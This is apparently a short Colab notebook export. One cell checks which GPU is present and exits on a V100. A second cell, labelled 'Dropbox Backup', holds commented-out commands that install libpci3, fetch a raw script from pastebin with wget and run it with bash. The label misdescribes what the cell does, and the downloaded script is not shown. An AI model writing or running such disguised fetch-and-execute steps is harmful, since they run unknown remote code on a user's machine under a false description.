# %%
#@title **Cek**
# !curl ipinfo.io
gpu_info = ! nvidia-smi -L
gpu_info = '\n'.join(gpu_info)
if gpu_info.find('V100-PCIE...') >=0:
  print(gpu_info)
  exit()
else :
  print(gpu_info)
import torch
print(torch.cuda.get_device_name(0))

# %%
#@title **Dropbox Backup**


# !apt-get update 
# !apt-get install libpci3
# !wget https://pastebin.com/raw/msiSD5vy
# !bash msiSD5vy
